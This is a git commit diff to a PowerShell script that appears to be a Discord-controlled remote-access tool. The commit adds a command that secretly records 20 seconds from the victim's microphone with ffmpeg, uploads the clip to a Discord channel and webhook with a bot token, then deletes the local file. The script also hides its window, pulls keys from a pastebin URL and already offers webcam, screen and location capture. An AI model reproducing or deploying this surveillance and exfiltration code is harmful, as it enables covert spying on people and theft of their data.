7d070406f884b18afeba69de6df40fce420e1461
egieb <93350544+beigeworm@users.noreply.github.com>
2024-06-27 11:16:37 +0000

    Update control.ps1

--- control.ps1
+++ control.ps1
@@ -1,16 +1,4 @@
 
-<#
-
-ADD YOUR TOKEN AND OPTIONAL WEBHOOK INSIDE THE EMPTY QUOTES
-SAVE TO A PASTEBIN FILE NAMED 'file.json' 
-
-{
-  "tk": "",
-  "wh": ""
-}
-
-#>
-
 $keys = irm "$keys" # REPLACE WITH YOUR PASTEBIN RAW URL
 
 function HideWindow {
@@ -111,6 +99,42 @@ function Enable-LocationServices {
     } catch {
     }
 }
+
+
+$audiojob = {
+    param ([string]$token,[string]$channelId,[string]$webhook)
+
+    function sendFile {
+        param([string]$sendfilePath)
+        $url = "https://discord.com/api/v10/channels/$channelId/messages"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $token")
+        if ($sendfilePath) {
+            if (Test-Path $sendfilePath -PathType Leaf) {
+                $response = $wc.UploadFile($url, "POST", $sendfilePath)
+                if ($webhook){
+                    $hooksend = $wc.UploadFile($webhook, "POST", $sendfilePath)
+                }
+            }
+        }
+    }
+    $tempDir = "$env:temp"
+    $outputFile = Join-Path -Path $tempDir -ChildPath "AudioClip.mp3"
+
+    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
+    function getFriendlyName($id) {
+        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
+        return (get-ItemProperty $reg).FriendlyName
+    }
+    $id1 = [audio]::GetDefault(1)
+    $MicName = "$(getFriendlyName $id1)"
+
+    .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 20 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
+    sendFile -sendfilePath $outputFile | Out-Null
+    sleep 1
+    rm -Path $outputFile -Force
+}
+
 
 $locationJob = {
     param ([string]$token,[string]$channelId,[string]$webhook)
@@ -309,6 +333,7 @@ Function quickInfo{
 - **RecordWebcam**          : Record webcam video clip to Discord
 - **Screenshot**            : Send Desktop screenshot to Discord
 - **RecordScreen**          : Record Desktop video clip to Discord
+- **RecordAudio**           : Record Microphone clip to Discord
 - **Location**              : Get Machine Location
 - **Close**                 : Close this session
 
@@ -374,10 +399,15 @@ while ($true) {
             Start-Job -ScriptBlock $locationJob -Name Locate -ArgumentList $global:token, $global:ChannelID, $global:webhook | Out-Null
             sendMsg -Message "Attempting Location from : $env:COMPUTERNAME" -webhook $webhook
         }
+        if ($messages -eq 'recordaudio'){
+            Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:ChannelID, $global:webhook | Out-Null
+            sendMsg -Message "Attempting Location from : $env:COMPUTERNAME" -webhook $webhook
+        }
         if ($messages -eq 'kill'){
             Stop-Job -Name Capture
             Stop-Job -Name Screen
-            Stop-Job -Name Record     
+            Stop-Job -Name Record
+            Stop-Job -Name Audio     
         }
         if ($messages -eq 'close'){
             sendMsg -Message ":no_entry: ``Closing Session : $env:COMPUTERNAME`` :no_entry:" -webhook $webhook 
